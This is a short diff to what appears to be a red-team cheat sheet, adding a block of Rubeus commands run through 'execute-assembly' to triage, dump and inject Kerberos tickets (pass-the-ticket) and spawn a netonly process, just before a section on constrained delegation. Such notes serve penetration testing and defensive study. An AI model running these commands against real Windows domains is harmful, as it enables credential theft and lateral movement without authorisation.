@@ -24,6 +24,13 @@ execute-assembly C:\Users\Public\Rubeus.exe triage
 Rubeus dump /luid:0x1b37e  
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
 Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
+
+```
+```
+execute-assembly C:\Users\Public\Rubeus.exe triage
+execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1f5d5  
+execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x686cf9 /ticket:
 ```
 
 ### Constrained Delegation
